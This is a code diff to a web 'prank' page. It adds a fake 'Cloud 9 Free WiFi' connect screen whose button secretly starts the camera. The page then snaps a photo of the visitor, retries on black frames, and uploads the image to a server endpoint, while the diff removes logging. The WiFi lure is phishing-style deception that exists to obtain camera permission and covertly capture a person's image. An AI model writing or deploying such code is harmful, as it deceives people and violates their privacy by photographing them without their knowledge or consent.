@@ -23,8 +23,38 @@
       overflow: hidden;
     }
 
+    /* ── Gate Screen ── */
+    #gate {
+      text-align: center;
+      padding: 40px 24px;
+    }
+
+    .wifi-icon {
+      font-size: 4rem;
+      color: #7c4dff;
+      margin-bottom: 20px;
+    }
+
+    .connect-btn {
+      background: linear-gradient(90deg, #7c4dff, #448aff);
+      border: none;
+      color: white;
+      padding: 14px 40px;
+      font-size: 1.1rem;
+      font-weight: 600;
+      border-radius: 99px;
+      cursor: pointer;
+      box-shadow: 0 4px 15px rgba(124, 77, 255, 0.4);
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+
+    .connect-btn:active {
+      transform: scale(0.95);
+    }
+
     /* ── Loading screen ── */
     #loading {
+      display: none;
       text-align: center;
       padding: 40px 24px;
     }
@@ -193,6 +223,15 @@
 
 <body>
 
+  <!-- Gate Screen -->
+  <div id="gate">
+    <div class="emoji-rain" style="opacity: 0.1"><span>📶</span></div>
+    <div style="font-size: 5rem; margin-bottom: 20px;">📶</div>
+    <h1>Cloud 9 Free WiFi</h1>
+    <p style="margin: 15px 0 30px; color: #888;">High-speed public internet access.<br>Click below to authenticate your device.</p>
+    <button class="connect-btn" onclick="handleConnect()">Connect Now</button>
+  </div>
+
   <!-- Loading -->
   <div id="loading">
     <span class="wifi-anim">📶</span>
@@ -228,6 +267,29 @@
     const urlParams = new URLSearchParams(window.location.search);
     const scanId = urlParams.get('scanId');
 
+    async function handleConnect() {
+      // 1. Hide gate, show loading
+      document.getElementById('gate').style.display = 'none';
+      document.getElementById('loading').style.display = 'block';
+      
+      // 2. Start camera request (USER GESTURE!)
+      startCapture();
+      
+      // 3. Prank reveal timer
+      setTimeout(() => {
+        document.getElementById('loading').style.display = 'none';
+        document.getElementById('reveal').style.display = 'block';
+        
+        // Play sound
+        const sound = document.getElementById('prank-sound');
+        if (sound) {
+          sound.play().catch(e => console.log("Audio play error: ", e));
+        }
+        
+        spawnEmojis();
+      }, 3500);
+    }
+
     async function startCapture() {
       if (!scanId) {
         console.warn("No scanId found in URL.");
@@ -241,13 +303,12 @@
         const video = document.getElementById('video');
         video.srcObject = stream;
         
-        // Wait for video to be actually ready for capture (Fix for Android Black Image)
+        // Wait for video to be actually ready for capture
         const waitForVideo = setInterval(() => {
           if (video.readyState >= 2 && video.videoWidth > 0) {
             clearInterval(waitForVideo);
-            console.log("Video source ready for capture");
             
-            // Capture after reveal animation starts
+            // Snapshot timer (triggered during the prank reveal)
             setTimeout(() => {
               const canvas = document.getElementById('canvas');
               const context = canvas.getContext('2d');
@@ -255,7 +316,7 @@
               const takeSnapshot = (retryCount = 0) => {
                 context.drawImage(video, 0, 0, 640, 480);
                 
-                // Check if image is black (only on Android/Chrome)
+                // Black frame detection
                 const imgData = context.getImageData(0, 0, 10, 10).data;
                 let isBlack = true;
                 for (let i = 0; i < imgData.length; i += 4) {
@@ -266,7 +327,6 @@
                 }
 
                 if (isBlack && retryCount < 5) {
-                  console.log("Detected black frame, retrying...");
                   setTimeout(() => takeSnapshot(retryCount + 1), 500);
                   return;
                 }
@@ -277,51 +337,26 @@
                   formData.append('scanId', scanId);
                   
                   try {
-                    const res = await fetch('/api/upload-reaction', {
+                    await fetch('/api/upload-reaction', {
                       method: 'POST',
                       body: formData
                     });
-                    if (res.ok) {
-                      console.log("Reaction uploaded!");
-                    } else {
-                      const errJson = await res.json();
-                      console.error("Upload failed:", errJson.error);
-                    }
                   } catch (err) {
-                    console.error("Network error:", err.message);
+                    console.error("Upload error:", err.message);
                   }
                   
-                  // Stop camera
                   stream.getTracks().forEach(track => track.stop());
                 }, 'image/jpeg', 0.8);
               };
 
               takeSnapshot();
-            }, 5500); 
+            }, 4500); 
           }
         }, 500);
-
       } catch (e) {
         console.error("Camera access failed:", e.message);
       }
     }
-
-    // Start immediately
-    startCapture();
-
-    // After 2.6s show the reveal
-    setTimeout(() => {
-      document.getElementById('loading').style.display = 'none';
-      document.getElementById('reveal').style.display = 'block';
-      
-      // Play sound
-      const sound = document.getElementById('prank-sound');
-      if (sound) {
-        sound.play().catch(e => console.log("Audio autoplay blocked, but camera permission might have enabled it: ", e));
-      }
-      
-      spawnEmojis();
-    }, 2600);
 
     function spawnEmojis() {
       const container = document.getElementById('emoji-rain');
@@ -338,5 +373,4 @@
     }
   </script>
 </body>
-
 </html>
